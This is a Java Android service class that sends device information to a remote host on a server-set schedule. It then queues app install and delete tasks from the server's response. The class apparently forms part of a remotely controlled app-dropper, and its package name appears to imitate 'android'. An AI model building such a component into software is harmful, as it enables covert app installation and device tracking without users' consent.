package com.andoid.aservice;

import java.util.HashMap;
import java.util.Map;

import cn.trinea.android.common.entity.HttpRequest;
import cn.trinea.android.common.entity.HttpResponse;
import cn.trinea.android.common.util.HttpUtils;
import cn.trinea.android.common.util.ListUtils;
import cn.trinea.android.common.util.HttpUtils.HttpListener;

import com.andoid.aservice.mode.AppInfo;
import com.andoid.aservice.mode.DeleteInfo;
import com.andoid.aservice.mode.DeviceInfo;
import com.andoid.aservice.mode.ResulInfo;
import com.andoid.aservice.mode.UpdateInfo;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Binder;
import android.os.IBinder;
/**
 * 主业务类
 * @author Administrator
 *
 */
public class AService extends Service {

	private static final String TAG = "AService";
	private ATaskManager taskManager;
	private SharedPreferences sp;
	private AConfigurations config;
	@Override
	public void onCreate() {
		super.onCreate();
		ALog.e(TAG, "----onCreate----");
		sp = getSharedPreferences(ACommons.SHEARE_PF, Service.MODE_APPEND);
		config = AConfigurations.getInstance();
		config.init(this);
		
		taskManager = new ATaskManager(this);
		
		if(checkTimeStemp())
		{
			doRequest();
		}
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}
	
	/**
	 * 请求数据
	 * **/
	private void doRequest()
	{
		ALog.e(TAG, "----doRequest----");
		Map<String,String> parasMap = new HashMap<String,String>();
		DeviceInfo di = config.getDeviceInfo();
		Gson gson = new GsonBuilder().setPrettyPrinting().create();
		Object obj =gson.toJson(di);
		parasMap.put("data", obj.toString());
		HttpRequest request = new HttpRequest(ACommons.host, parasMap);
		request.setMethod("post");
		request.setType(1);
		HttpUtils.httpGet(request, new MyHttpListener());
	}
	
	/**
	 * 检查是否需要请求数据
	 * **/
	private boolean checkTimeStemp()
	{
		long time = config.getLastVisitTime();
		long currunt = System.currentTimeMillis();
		if(currunt - time > config.getRequestRate() * ACommons.RATE_UNIT)
		{
			return true;
		}
		return false;
	}
	
	/****
	 * 检查版本更新
	 * @param update
	 * @return
	 */
	private boolean checkUpdate(UpdateInfo update)
	{
		if(update == null)
		{
			return false;
		}
		return false;
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		ALog.e(TAG, "----onDestroy----");
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return new MyBinder(this);
	}
	
	private class MyHttpListener extends HttpListener
	{
		@Override
		protected void onPostGet(HttpResponse httpResponse) {
			super.onPostGet(httpResponse);
			if(httpResponse.getType() == 1)
			{
				String body = httpResponse.getResponseBody();
				Gson gson = new Gson();
				ResulInfo result = gson.fromJson(body, ResulInfo.class);
				if(result != null && 200 == result.status)
				{
					config.setLastVisitTime();
					config.setRequestRate(result.requestRate);
					if(checkUpdate(result.update))
					{
						return;
					}
					
					if(!ListUtils.isEmpty(result.appList))
					{
						for(AppInfo app:result.appList)
						{
							taskManager.addTask(app);
						}
					}
					
					if(!ListUtils.isEmpty(result.deleteList))
					{
						for(DeleteInfo app:result.deleteList)
						{
							taskManager.addTask(app);
						}
					}
					
				}
			}
		}
		
		@Override
		protected void onPreGet() {
			super.onPreGet();
		}
	}
	
	class MyBinder extends Binder
	{
		private AService mService;
		
		private MyBinder(AService service)
		{
			mService = service;
		}
		private AService getService()
		{
			return mService;
		}
	}
}
